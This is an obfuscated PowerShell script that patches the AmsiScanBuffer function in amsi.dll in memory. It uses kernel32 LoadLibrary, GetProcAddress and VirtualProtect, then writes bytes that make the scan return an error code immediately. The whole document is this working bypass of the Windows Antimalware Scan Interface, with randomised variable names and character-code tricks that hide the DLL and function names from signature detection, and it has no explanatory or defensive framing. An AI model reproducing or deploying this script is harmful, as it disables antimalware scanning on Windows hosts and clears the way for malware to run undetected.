$hZGYhNZa = @"
using System;
using System.Runtime.InteropServices;
public class hZGYhNZa {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr srDJY0MSs3XOfT0tek, string ASxjvLLI);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr it8ZEu, UIntPtr yCL5qXkjdbRB, uint HmEGao5ZWluALqCVk, out uint RfkMloavt);
}
"@

Add-Type $hZGYhNZa

$Vc6nJqn = [hZGYhNZa]::LoadLibrary("$(('ä'+'m'+'s'+'ì'+'.'+'d'+'l'+'l').nORmaliZe([cHar](70)+[CHaR](23+88)+[cHAR]([bytE]0x72)+[CHAR]([ByTE]0x6d)+[Char]([ByTE]0x44)) -replace [CHaR]([bYTe]0x5c)+[ChAr]([ByTE]0x70)+[ChaR]([Byte]0x7b)+[chAr](77)+[CHAr](110)+[cHAr](125+84-84))")
$QKH0s_agVrZbqO = [hZGYhNZa]::GetProcAddress($Vc6nJqn, "$([ChAR]([byTe]0x41)+[Char]([byTE]0x6d)+[CHaR](89+26)+[chAR]([bytE]0x69)+[cHaR]([ByTe]0x53)+[chAR](94+5)+[cHAR]([bytE]0x61)+[Char](110*44/44)+[chAr]([bytE]0x42)+[cHAR](117*4/4)+[cHAr]([BytE]0x66)+[CHAR]([ByTE]0x66)+[chAr](101)+[CHAr](114+108-108))")
$p = 0
[hZGYhNZa]::VirtualProtect($QKH0s_agVrZbqO, [uint32]5, 0x40, [ref]$p)
$fdEN = "0xB8"
$mhRh_n8597pWrdOR_ = "0x57"
$eqQ6Fz5n1 = "0x00"
$CVBFDUIrLX = "0x07"
$ZIGNFu = "0x80"
$indi2D = "0xC3"
$BuIUI = [Byte[]] ($fdEN,$mhRh_n8597pWrdOR_,$eqQ6Fz5n1,$CVBFDUIrLX,+$ZIGNFu,+$indi2D)
[System.Runtime.InteropServices.Marshal]::Copy($BuIUI, 0, $QKH0s_agVrZbqO, 6)